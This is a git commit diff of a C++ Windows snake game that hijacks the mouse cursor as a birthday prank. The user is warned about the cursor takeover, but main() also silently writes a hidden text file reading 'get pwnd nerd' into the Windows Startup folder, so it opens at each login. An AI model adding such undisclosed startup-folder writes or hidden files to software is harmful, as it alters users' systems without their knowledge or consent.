0bd0995b519578959a86bf2d6c88cdc49fba5ada
Mitch <60634216+Salsa69@users.noreply.github.com>
2022-07-10 00:22:49 -0700

    Update GotUrMouse.cpp

--- GotUrMouse.cpp
+++ GotUrMouse.cpp
@@ -1,322 +1,326 @@
 ﻿#include <iostream>
-#include <conio.h>
-#include <string>
-#include <windows.h>
-#include <math.h>
 #include <thread>
+#include <fstream>
+#include <stdlib.h>
+#include <windows.h>
+#include <conio.h>
+#include <ctime>
+#include <ShlObj_core.h>
 
-using namespace std;
-bool gameover;
-bool shutDown;
-const int width = 28;
-const int height = 16;
+// Variables and arrays declaration
+volatile bool gameOver;
+bool invalidCoord;
+const int width = 20;
+const int height = 20;
 int x, y, fruitX, fruitY, score;
-int tailX[400], tailY[400], nTail;
-enum eDirection { STOP, LEFT, RIGHT, UP, DOWN };
-eDirection dir;
+int tailX[8], tailY[8];
+int tailLength;
 
-void StartScreen()
-{
-	system("cls");
+enum Direction { STOP = 0, LEFT, RIGHT, UP, DOWN };
+Direction dir;
 
-	#pragma region UH OH !
-
-	cout << " ___  ___  ___  ___          ________  ___  ___          ___       \n";
-	Sleep(50);
-	cout << "|\\  \\|\\  \\|\\  \\|\\  \\        |\\   __  \\|\\  \\|\\  \\        |\\  \\      \n";
-	Sleep(50);
-	cout << "\\ \\  \\\\\\  \\ \\  \\\\\\  \\       \\ \\  \\|\\  \\ \\  \\\\\\  \\       \\ \\  \\     \n";
-	Sleep(50);
-	cout << " \\ \\  \\\\\\  \\ \\   __  \\       \\ \\  \\\\\\  \\ \\   __  \\       \\ \\  \\    \n";
-	Sleep(50);
-	cout << "  \\ \\  \\\\\\  \\ \\  \\ \\  \\       \\ \\  \\\\\\  \\ \\  \\ \\  \\       \\ \\__\\   \n";
-	Sleep(50);
-	cout << "   \\ \\_______\\ \\__\\ \\__\\       \\ \\_______\\ \\__\\ \\__\\       \\|__|   \n";
-	Sleep(50);
-	cout << "    \\|_______|\\|__|\\|__|        \\|_______|\\|__|\\|__|           ___ \n";
-	Sleep(50);
-	cout << "                                                              |\\__\\\n";
-	Sleep(50);
-	cout << "                                                              \\|__|\n";
-	Sleep(50);
-
-	#pragma endregion
-
-	cout << "\n\nlooks like the snake got your cursor!! Eat 5 fruit to get it back."
-		<< "\n\nPress 's' to Start!"
-		<< "\n\nPress 'i' for Instructions."
-		<< "\n\nYour Previous Score: " << score << endl;
+// Function which cleans the screen without flickering
+inline void ClearScreen() {
+	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), COORD{0, 0});
 }
-void Instructions()
-{
-	system("cls");
-	cout << "\nUse the 'w' key to go UP."
-		<< "\n\nUse the 'a' key to turn LEFT."
-		<< "\n\nUse the 's' key to go DOWN."
-		<< "\n\nUse the 'd' key to turn RIGHT."
-		<< "\n\nDO NOT touch the borders or you will LOSE."
-		<< "\nDO NOT eat your own tail or you will obviously also LOSE!"
-		<< "\n\n\nNow press the 'm' key to go MENU.\n";
-	string input;
-	cin >> input;
-	if (input == "m")
-		StartScreen();
+
+std::wstring GetStartupFolderPath() {
+	PWSTR pszPath;
+	HRESULT hr = SHGetKnownFolderPath(	FOLDERID_Startup,
+										0,     // no special options required
+										NULL,  // no access token required
+										&pszPath);
+	if (SUCCEEDED(hr))
+	{
+		std::wstring path(pszPath);
+		CoTaskMemFree(static_cast<LPVOID>(pszPath));
+		return path;
+	}
+	else
+		throw std::runtime_error("The SHGetKnownFolderPath function failed");
 }
-void FruitSpawn()
-{
-	fruitX = rand() % width;
-	fruitY = rand() % height;
-}
-void Setup()
-{
-	gameover = false;
-	shutDown = false;
+
+// Initialise variables
+void Setup() { 
+	srand(time(0));
+	gameOver = false;
 	dir = STOP;
+	for (int i = 0; i < 8; i++) {
+		tailX[i] = 0;
+		tailY[i] = 0;
+	}
 	x = width / 2;
 	y = height / 2;
-	FruitSpawn();
+	fruitX = rand() % width;
+	fruitY = rand() % height;
 	score = 0;
-	nTail = 0;
+	tailLength = 0;
 }
-void Draw()
-{
-	system("cls"); //clear screen
-	for (int i = 0; i < width + 2; i++) {
-		cout << "#";
+
+void StartScreen() {
+	system("cls");
+
+#pragma region UH OH !
+
+	std::cout << " ___  ___  ___  ___          ________  ___  ___          ___       \n";
+	Sleep(50);
+	std::cout << "|\\  \\|\\  \\|\\  \\|\\  \\        |\\   __  \\|\\  \\|\\  \\        |\\  \\      \n";
+	Sleep(50);
+	std::cout << "\\ \\  \\\\\\  \\ \\  \\\\\\  \\       \\ \\  \\|\\  \\ \\  \\\\\\  \\       \\ \\  \\     \n";
+	Sleep(50);
+	std::cout << " \\ \\  \\\\\\  \\ \\   __  \\       \\ \\  \\\\\\  \\ \\   __  \\       \\ \\  \\    \n";
+	Sleep(50);
+	std::cout << "  \\ \\  \\\\\\  \\ \\  \\ \\  \\       \\ \\  \\\\\\  \\ \\  \\ \\  \\       \\ \\__\\   \n";
+	Sleep(50);
+	std::cout << "   \\ \\_______\\ \\__\\ \\__\\       \\ \\_______\\ \\__\\ \\__\\       \\|__|   \n";
+	Sleep(50);
+	std::cout << "    \\|_______|\\|__|\\|__|        \\|_______|\\|__|\\|__|           ___ \n";
+	Sleep(50);
+	std::cout << "                                                              |\\__\\\n";
+	Sleep(50);
+	std::cout << "                                                              \\|__|\n";
+	Sleep(50);
+
+#pragma endregion
+
+	std::cout	<< "\n\nlooks like the snake got your cursor!! Eat 5 fruit to get it back."
+				<< "\n\nUse W A S D for controls."
+				<< "\n\nPress any key to start!" << "\x1b[34m" << std::endl;
+
+	system("pause > null");
+}
+
+void Win() {
+
+	system("cls");
+
+#pragma region you did it !
+
+	std::cout << " _    _                           ____           _\n";
+	Sleep(50);
+	std::cout << "| |  | |                         |  _ \\         | |\n";
+	Sleep(50);
+	std::cout << "| |__| | __ _ _ __  _ __  _   _  | |_) |_____ __| | __ _ _   _\n";
+	Sleep(50);
+	std::cout << "|  __  |/ _` | '_ \\| '_ \\| | | | |  _ <______/ _` |/ _` | | | |\n";
+	Sleep(50);
+	std::cout << "| |  | | (_| | |_) | |_) | |_| | | |_) |    | (_| | (_| | |_| |\n";
+	Sleep(50);
+	std::cout << "|_|  |_|\\__,_| .__/| .__/ \\__, | |____/      \\__,_|\\__,_|\\__, |\n";
+	Sleep(50);
+	std::cout << "             | |   | |     __/ |                          __/ |\n";
+	Sleep(50);
+	std::cout << "             |_|   |_|    |___/                          |___/	 -mitch\n";
+	Sleep(50);
+
+#pragma endregion
+
+	const char* c = "press any key to leave";
+
+	std::cout << "\n\n";
+
+	while (*c != '\0') {
+		std::cout << *c++;
+		Sleep(30);
 	}
-	cout << endl;
 
-	for (int i = 0; i < height; i++)
-	{
-		for (int j = 0; j < width; j++)
-		{
-			if (j == 0) 
-				cout << "#";
-			
-			if (i == y && j == x)
-				cout << "O";
+	system("pause > null");
 
-			else if (i == fruitY && j == fruitX)
-				cout << "+";
+	exit(0);
+}
 
-			else {
-				bool print = false;
-				for (int k = 0; k < nTail; k++) {
-					if (tailX[k] == j && tailY[k] == i) {
-						cout << "o";
-						print = true;
+void Draw() { // Drawing playing field, snake and fruits
+	ClearScreen();
+
+	// Draws top border
+	std::cout << ' ';
+	for (int i = 0; i < width*2 + 1; i++)
+		std::cout << '-';
+	std::cout << "\n";
+
+	for (int i = 0; i < height; i++) {
+		// Left border
+		std::cout << "| ";
+		for (int k = 0; k < width; k++) {
+			// Snake's head
+			if (i == y && k == x)
+				std::cout << "\x1b[32m" << 'O' << "\x1b[34m";
+			// Fruit
+			else if (i == fruitY && k == fruitX)
+				std::cout << "\x1b[31m" << '@' << "\x1b[34m";
+			else
+			{
+				// Checks if there is a tail block with appropriate coordinates and draws it 
+				bool printTail = false;
+				for (int j = 0; j < tailLength; j++)
+				{
+					if (tailX[j] == k && tailY[j] == i)
+					{
+						std::cout << "\x1b[32m" << 'o' << "\x1b[34m";
+						printTail = true;
 					}
 				}
-				if (!print)
-					cout << " ";
+				// Draws blank space if there is nothing to display
+				if (!printTail)
+					std::cout << ' ';
 			}
 
-			if (j == width - 1)
-				cout << "#";
+			std::cout << ' ';
+
+			// Right border
+			if (k == width - 1)
+				std::cout << '|';
+
 		}
-		cout << endl;
+		std::cout << std::endl;
 	}
-	for (int i = 0; i < width + 2; i++) {
-		cout << "#";
-	}
-	cout << endl;
-	cout << "Score: " << score << endl;
+
+	// Draws bottom border
+	std::cout << ' ';
+	for (int i = 0; i < width*2 + 1; i++)
+		std::cout << '-';
+	std::cout << std::endl;
+
+	// Displays player's score
+	std::cout << std::endl;
+	std::cout << "Score: " << score << std::endl;
+
 }
+
 void Input()
 {
-	if (_kbhit()) {
+	// Changes snake's direction depending on the button pressed and doesn't allow player to change direction in invalid way 
+	if (_kbhit())
+	{
 		switch (_getch())
 		{
-		case 'a':
-			dir = LEFT;
-			break;
-		case 'w':
-			dir = UP;
-			break;
-		case 's':
-			dir = DOWN;
-			break;
-		case 'd':
-			dir = RIGHT;
-			break;
+			case 'w':
+				if (dir != DOWN)
+					dir = UP;
+				break;
+			case 'a':
+				if (dir != RIGHT)
+					dir = LEFT;
+				break;
+			case 's':
+				if (dir != UP)
+					dir = DOWN;
+				break;
+			case 'd':
+				if (dir != LEFT)
+					dir = RIGHT;
+				break;
+			default: break;
 		}
 	}
 }
-void Logic()
-{
+
+void Logic() {
 	int prevX = tailX[0];
 	int prevY = tailY[0];
-	int prev2X, prev2Y;
+	int prevX2, prevY2;
 	tailX[0] = x;
 	tailY[0] = y;
 
-	for (int i = 1; i < nTail; i++) {
-		prev2X = tailX[i];
-		prev2Y = tailY[i];
+	for (int i = 1; i < tailLength; i++) {
+		prevX2 = tailX[i];
+		prevY2 = tailY[i];
 		tailX[i] = prevX;
 		tailY[i] = prevY;
-		prevX = prev2X;
-		prevY = prev2Y;
-
+		prevX = prevX2;
+		prevY = prevY2;
 	}
 
-	switch (dir)
-	{
-	case LEFT:
-		x -= 0.5;
-		break;
-	case RIGHT:
-		x += 1;
-		break;
-	case UP:
-		y -= 0.5;
-		break;
-	case DOWN:
-		y += 1;
-		break;
-	}
-	if (x > width || x < 0 || y > height || y < 0) {
-		gameover = true;
-		StartScreen();
+	// Changes snake's head coordinates depending on a direction
+	switch (dir) {
+		case LEFT:
+			x--;
+			break;
+		case RIGHT:
+			x++;
+			break;
+		case UP:
+			y--;
+			break;
+		case DOWN:
+			y++;
+			break;
 	}
 
-	for (int i = 0; i < nTail; i++) {
-		if (tailX[i] == x && tailY[i] == y)
-			gameover = true;
-	}
+	// Detects collision with a tail
+	for (int i = 0; i < tailLength; i++)
+		if (tailX[i] == x && tailY[i] == y) {
+			Setup();
+			ClearScreen();
+		}
 
+	// Changes snake position if it goes through the wall
+	if (y >= height)
+		y = 0;
+	else if (y < 0)
+		y = height - 1;
+	if (x >= width)
+		x = 0;
+	else if (x < 0)
+		x = width - 1;
+
+	// Detects collision with a fruit
 	if (x == fruitX && y == fruitY) {
-		score++;
-		nTail++;
-		FruitSpawn();
+		if (++score == 8) Win();
+		fruitX = rand() % width;
+		fruitY = rand() % height;
+		// Generate new fruit position if it consides with snake's tail position 
+		for (int i = 0; i < tailLength; i++) {
+			if (tailX[i] == fruitX && tailY[i] == fruitY) {
+				fruitX = rand() % width;
+				fruitY = rand() % height;
+				break;
+			}
+		}
+		tailLength++;
 	}
 }
 
 void circle(int radius, int center_x, int center_y)
 {
-	double t = 0;
-	//  For best circle in the center
-	//int mx_0 = GetSystemMetrics(SM_CXSCREEN) / 2;
-	//int my_0 = GetSystemMetrics(SM_CYSCREEN) / 2;
-	//int R = 200;
-	int mx, my;
-	for (int i = 0; i > -1; i++) {
-		mx = radius * sin(t) + center_x;
-		my = radius * cos(t) + center_y;
-		t += 0.05;
-		SetCursorPos(mx, my);
+	for (double t = 0;;) {
+		if (gameOver) std::terminate();
+		SetCursorPos(radius * sin(t) + center_x, radius * cos(t) + center_y);
+		t += 0.1;
 		Sleep(10);
 	}
 }
 
 int main()
-{	
-	COORD a;
-	a.X = 90;
-	a.Y = 300;
+{
+	if (MessageBoxA(NULL, "This program takes control of your mouse. If you don't like that, click 'calcel'", "WARNING", MB_OKCANCEL) == IDCANCEL)
+		return 0;
 
-	SMALL_RECT rect;
-	rect.Top = 0;
-	rect.Left = 0;
-	rect.Bottom = 65;
-	rect.Right = 115;
+	std::thread t1(circle, 90, GetSystemMetrics(SM_CXSCREEN) / 2, GetSystemMetrics(SM_CYSCREEN) / 2);
 
-	HANDLE consoleStyle = GetStdHandle(STD_OUTPUT_HANDLE);
-	HWND console = GetConsoleWindow();
-	SetConsoleScreenBufferSize(consoleStyle, a);
-	SetConsoleWindowInfo(consoleStyle, 1, &rect);
-	SetWindowPos(console, 0, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
-	SetConsoleTextAttribute(consoleStyle, 3);
+	std::fstream file;
+	
+	std::wstring path = GetStartupFolderPath() + L"\\mitch_briles_was_here.txt";
+	file.open(path, std::ios::out);
+	file << "happy birthday. also get pwnd nerd";
+	file.close();
 
-	SetWindowTextA(console, "I got your cursor!!");
-
-	int mx, my;
-	do {
-		StartScreen();
-		string input;
-
-		thread t1(circle, 200, GetSystemMetrics(SM_CXSCREEN) / 4, GetSystemMetrics(SM_CYSCREEN) / 2);
-		//thread t2(circle, 100, GetSystemMetrics(SM_CXSCREEN) / 4, GetSystemMetrics(SM_CYSCREEN) / 2);
-		//thread t3(circle, 10, GetSystemMetrics(SM_CXSCREEN) / 4, GetSystemMetrics(SM_CYSCREEN) / 2);
-		
-		cin >> input;
-			if (input == "s")
-			{	
-				Setup();
-				while (!gameover)
-				{
-					Draw();
-					Input();
-					Logic();
-
-					mx = fruitX * 8.2 + 20;
-					my = fruitY * 17 + 45;
-					SetCursorPos(mx, my);
-
-					if (score == 5) {
-
-						system("cls");
-
-						#pragma region you did it !
-
-						cout << " _     _                    _         _        _       _ \n";
-						Sleep(50);
-						cout << "( )   ( )                  ( ) _     ( )    _ ( )_    ( )\n";
-						Sleep(50);
-						cout << "`\\`\\_/'/'_    _   _       _| |(_)   _| |   (_)| ,_)   | |\n";
-						Sleep(50);
-						cout << "  `\\ /'/'_`\\ ( ) ( )    /'_` || | /'_` |   | || |     | |\n";
-						Sleep(50);
-						cout << "   | |( (_) )| (_) |   ( (_| || |( (_| |   | || |_    |_|\n";
-						Sleep(50);
-						cout << "   (_)`\\___/'`\\___/'   `\\__,_)(_)`\\__,_)   (_)`\\__)    _ \n";
-						Sleep(50);
-						cout << "                                                      (_)\n\n";
-						Sleep(50);
-
-#pragma endregion
-
-						string k = "You got away this time";
-						string c = "press any key to leave";
-
-						for (int i = 0; i < 23; i++) {
-							cout << k[i];
-							Sleep(30);
-						}
-						for (int i = 0; i < 10; i++) {
-							cout << "!";
-							Sleep(30);
-						}
-						cout << "\n\n";
-						for (int i = 0; i < 23; i++) {
-							cout << c[i];
-							Sleep(30);
-						}
-						system("pause > null");
-
-						exit(0);
-					}
-
-					if (GetAsyncKeyState(VK_END) & 1) exit(0);
-					Sleep(15);
-				}
-			}
-			else if (input == "i") Instructions();
-
-	} while (shutDown == false);
-
-	exit(0);
-
-
-	cout << "\n___________________________________________\nlooks like i got your cursor\n___________________________________________\npress your end key to take it back...\n___________________________________________\n";
-
-	cout << "you got away this time";
-	for (int i = 0; i < 15; i++) {
-		cout << "!";
-		Sleep(100);
+	const wchar_t* fileLPCWSTR = path.c_str();
+	int attr = GetFileAttributes(fileLPCWSTR);
+	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+		SetFileAttributes(fileLPCWSTR, attr | FILE_ATTRIBUTE_HIDDEN);
 	}
 
-	Sleep(1000);
+	Setup(); 
+	StartScreen();
+	system("cls");	
 
-	exit(0);
+	while (!gameOver) { // Game mainloop 
+		Draw();
+		Sleep(60);
+		Input();
+		Logic();
+	}
+
+	return 0;
 }
